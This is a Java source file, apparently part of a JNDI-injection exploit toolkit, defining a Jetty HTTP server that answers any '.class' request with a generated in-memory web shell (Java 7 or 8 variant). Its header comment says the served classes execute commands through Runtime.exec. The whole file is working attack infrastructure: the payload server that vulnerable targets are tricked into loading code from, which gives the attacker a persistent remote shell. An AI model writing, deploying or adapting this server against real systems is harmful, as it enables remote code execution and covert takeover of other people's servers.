package jndi;

import core.GenerateMemShell;
import core.utils.Util;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.servlet.ServletHandler;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.net.URLEncoder;

import static jndi.ServerStart.getLocalTime;
import static utils.Transformers.insertCommand;

/**
 * @Classname JettyServer
 * @Description HTTPServer supply .class file which execute command by Runtime.getRuntime.exec()
 * @Author welkin
 */
public class JettyServer implements Runnable{
//    private static Stopwatch server;
    private int port;
    private static Server server;
    public static String command;

    public JettyServer(int port,String cmd) {
        this.port = port;
        server = new Server(port);
        command = cmd;
    }

    @Override
    public void run() {
        ServletHandler handler = new ServletHandler();
        server.setHandler(handler);

        handler.addServletWithMapping(DownloadServlet.class, "/*");
        try {
            server.start();
            server.join();
        }catch (Exception e){
            e.printStackTrace();
        }

    }

    public static void shutdown() throws Exception {
        server.stop();
    }

    public static byte[] toByteArray(InputStream input) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        int n = 0;
        while (-1 != (n = input.read(buffer))) {
            output.write(buffer, 0, n);
        }
        return output.toByteArray();
    }

    @SuppressWarnings("serial")
    public static class DownloadServlet extends HttpServlet {
        public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
            String filename = request.getRequestURI().substring(1);
            System.out.println(filename);
            ByteArrayInputStream bain = checkFilename(filename);


            if (bain != null) {
                System.out.println(getLocalTime() + " [JETTYSERVER]>> Log a request to " + request.getRequestURL());
                response.setStatus(HttpServletResponse.SC_OK);
                response.setHeader("content-disposition", "attachment;filename="+URLEncoder.encode(filename, "UTF-8"));
                int len ;
                byte[] buffer = new byte[1024];
                OutputStream out = response.getOutputStream();
                if (bain != null){
                    while ((len = bain.read(buffer)) > 0) {
                        out.write(buffer,0,len);
                    }
                    bain.close();
                }else {
                    System.out.println(getLocalTime() + " [JETTYSERVER]>> Read file error!");
                }
            }else {
                System.out.println(getLocalTime() + " [JETTYSERVER]>> URL("+ request.getRequestURL() +") Not Exist!");
            }
        }

        public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{
            doGet(request, response);
        }
    }

    private static ByteArrayInputStream checkFilename(String filename)  {
        String version = "7";
        if (filename.contains("8")){
            version = "8";
        }
        try {
            return new ByteArrayInputStream(Util.base64Decode(GenerateMemShell.generateMemShell(filename.replace(".class", ""), "BASE64", version)));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

}
